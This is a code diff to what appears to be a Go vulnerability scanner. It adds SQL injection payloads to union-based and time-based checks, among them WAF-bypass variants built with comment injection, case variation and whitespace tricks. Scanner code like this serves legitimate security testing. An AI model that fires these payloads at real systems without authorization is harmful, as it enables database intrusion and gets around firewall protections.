@@ -465,10 +465,17 @@ func (s *SQLInjectionSpecialist) verifyUnionBased(targetURL string, parameter st
 
 	// UNION SELECT payloads
 	payloads := []string{
+		// Basic payloads
 		"' UNION SELECT NULL,@@version-- -",
 		"' UNION SELECT NULL,database()-- -",
 		"' UNION SELECT NULL,version()-- -",
 		"1' UNION SELECT NULL,@@version-- -",
+		// WAF bypass - Comment injection
+		"'/**/UNION/**/SELECT/**/NULL,@@version--+-",
+		// WAF bypass - Case variation
+		"' UnIoN SeLeCt NULL,@@version-- -",
+		// WAF bypass - Additional conditions
+		"' UNION SELECT NULL,@@version WHERE '1'='1'-- -",
 	}
 
 	for _, payload := range payloads {
@@ -523,10 +530,15 @@ func (s *SQLInjectionSpecialist) verifyTimeBased(targetURL string, parameter str
 
 	// Time-based payloads (5 second delay)
 	payloads := []string{
+		// Basic payloads
 		"' AND SLEEP(5)-- -",
 		"' OR SLEEP(5)-- -",
 		"1' AND SLEEP(5)-- -",
 		"' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- -",
+		// WAF bypass - Comment injection
+		"'/**/AND/**/SLEEP(5)--+-",
+		// WAF bypass - Whitespace variation
+		"' AND\tSLEEP(5)-- -",
 	}
 
 	for _, payload := range payloads {
